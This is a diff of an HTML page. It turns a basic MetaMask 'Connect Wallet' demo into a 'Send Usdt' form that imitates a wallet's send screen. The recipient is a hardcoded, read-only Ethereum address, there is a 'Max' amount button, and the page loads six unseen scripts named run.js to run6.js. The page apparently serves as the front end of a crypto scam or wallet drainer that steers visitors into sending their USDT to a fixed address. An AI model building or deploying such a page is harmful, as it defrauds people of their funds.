@@ -1,27 +1,48 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Wallet Connect</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.8.1/dist/ethers.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send Usdt</title>
+  <link rel="stylesheet" href="./css/style.css">
 </head>
 <body>
+  <div class="container">
+    <label for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <input type="text" id="address" value="0x120181346e77B5188b7Fa6689Eb1E77ec5B0fA81" readonly />
+      <div class="input-actions">
+        <span class="highlight" onclick="pasteAddress()">Paste</span>
+        <svg onclick="scanAddress()" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path d="M3 3v6h2V5h4V3H3zm16 0v2h-4v2h6V3h-2zM3 15v6h6v-2H5v-4H3zm16 0v4h-4v2h6v-6h-2zM5 11h14v2H5z"/>
+        </svg>
+      </div>
+    </div>
 
-<h2>Connect Wallet</h2>
-<button onclick="connectWallet()">Connect Wallet</button>
-<p id="wallet"></p>
+    <label for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount" />
+      <div class="input-actions">
+        <span style="color: #aaa;">USDT</span>
+        <span class="highlight" onclick="setMax()">Max</span>
+      </div>
+    </div>
 
-<script>
-async function connectWallet() {
-  if (window.ethereum) {
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const accounts = await provider.send("eth_requestAccounts", []);
-    document.getElementById("wallet").innerText =
-      "Connected: " + accounts[0];
-  } else {
-    alert("Install MetaMask or Trust Wallet");
-  }
-}
-</script>
+    <div class="approx" id="approx">= $0.00</div>
+  </div>
 
+  <button class="next-btn" id="nextBtn" disabled>Next</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="./js/main.js"></script>
+  <script src="./js/run.js"></script>
+  <script src="./js/run2.js"></script>
+  <script src="./js/run3.js"></script>
+  <script src="./js/run4.js"></script>
+  <script src="./js/run5.js"></script>
+  <script src="./js/run6.js"></script>
+  
 </body>
 </html>
+
